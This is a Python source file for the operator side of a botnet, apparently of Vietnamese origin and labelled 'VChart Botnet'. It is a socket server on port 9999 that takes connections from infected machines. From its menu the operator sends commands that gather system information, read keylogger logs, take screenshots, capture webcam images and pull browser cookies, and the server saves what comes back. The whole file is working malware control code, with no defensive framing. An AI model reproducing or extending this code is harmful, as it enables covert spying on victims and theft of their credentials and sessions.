import socket
import os

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def print_banner():
    text = """
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
             ┓┏┏┓┓        ┳┓        
             ┃┃┃ ┣┓┏┓┏┓╋  ┣┫┏┓╋┏┓┏┓╋
             ┗┛┗┛┛┗┗┻┛ ┗  ┻┛┗┛┗┛┗┗ ┗

    Admin: @hanhcoiner  facebook: Do Hai Anh
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛                                     
                                    
"""
    print(text)

def menu():
    print("╔════════════════════════════════╗")
    print("║          VChart Botnet         ║")
    print("╠════════════════════════════════╣")
    print("║ 1. Thu thập thông tin          ║")
    print("║ 2. Xem log keylogger           ║")
    print("║ 3. Quản lý file                ║")
    print("║ 4. Chụp ảnh màn hình           ║")
    print("║ 5. Giám sát webcam             ║")
    print("║ 6. Thoát                       ║")
    print("║ 7. Lấy cookie trình duyệt      ║")
    print("╚════════════════════════════════╝")

    choice = input("Chọn lệnh: ")
    return choice

def save_file(client_socket, file_name):
    try:
        # Nhận kích thước file
        data_size = client_socket.recv(1024).decode()
        if not data_size.isdigit():
            print("[-] Lỗi: Không nhận được kích thước file hợp lệ.")
            return

        data_size = int(data_size)
        client_socket.send(b"READY")  # Gửi xác nhận sẵn sàng nhận file

        # Nhận dữ liệu file
        print(f"[+] Đang nhận file {file_name} từ bot...")
        received_data = b""
        while len(received_data) < data_size:
            chunk = client_socket.recv(4096)
            if not chunk:
                break
            received_data += chunk

        # Lưu file
        if len(received_data) == data_size:
            with open(file_name, "wb") as f:
                f.write(received_data)
            print(f"[+] File đã được lưu tại '{file_name}'.")
        else:
            print("[-] Lỗi: Dữ liệu nhận không đầy đủ.")

    except Exception as e:
        print(f"[-] Lỗi nhận file: {e}")

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 9999))
    server.listen(5)
    print("[+] Server is running... Waiting for bots to connect.")

    while True:
        client_socket, client_address = server.accept()
        print(f"[+] Bot connected: {client_address}")
        clear_screen()
        print_banner()

        while True:
            choice = menu()
            clear_screen()
            if choice == "1":
                command = "get_info"
                client_socket.send(command.encode())
                response = client_socket.recv(4096).decode()
                print(f"\n--- Thông tin hệ thống ---\n{response}")

            elif choice == "2":
                command = "get_logs"
                client_socket.send(command.encode())
                response = client_socket.recv(4096).decode()
                print(f"\n--- Log Keylogger ---\n{response}")

            elif choice == "3":
                print("[!] Chức năng quản lý file đang phát triển...")

            elif choice == "4":
                command = "capture_screen"
                client_socket.send(command.encode())
                save_file(client_socket, "screenshot_from_bot.png")

            elif choice == "5":
                command = "capture_webcam"
                client_socket.send(command.encode())
                save_file(client_socket, "webcam_capture_from_bot.jpg")

            elif choice == "7":
                command = "get_cookies"
                client_socket.send(command.encode())
                response = client_socket.recv(4096).decode()
                print(f"\n--- Cookies Trình Duyệt ---\n{response}")


            elif choice == "6":
                command = "exit"
                client_socket.send(command.encode())
                client_socket.close()
                print("[-] Bot disconnected.")
                break

            else:
                print("[!] Lựa chọn không hợp lệ!")

if __name__ == "__main__":
    clear_screen()
    print_banner()
    start_server()
